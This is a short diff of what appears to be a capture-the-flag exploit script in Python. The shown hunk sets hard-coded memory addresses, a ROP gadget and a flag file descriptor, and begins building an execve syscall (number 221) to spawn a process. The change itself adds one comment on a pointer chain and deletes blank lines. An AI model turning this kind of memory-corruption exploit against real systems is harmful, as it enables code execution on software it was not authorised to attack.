@@ -71,13 +71,12 @@ def open_at(io, p_addr, addr):
 def exploit(io,e):
     sleep(5)
     # 0x8a488 => 0x8a2b8 => 0x8a518 => writeable mem
+    # pp_addr -> p_addr -> writeable_ptr -> writeable mem
     flag_fd = 5
     p_addr = 0x8a2b8
     pp_addr = 0x8a488
     writable_addr = 0x8a510
     gadget = 0x2c3be
-
-
 
     ecall_num = p64(0xdd) # execve 221
     third_arg = p64(0) 
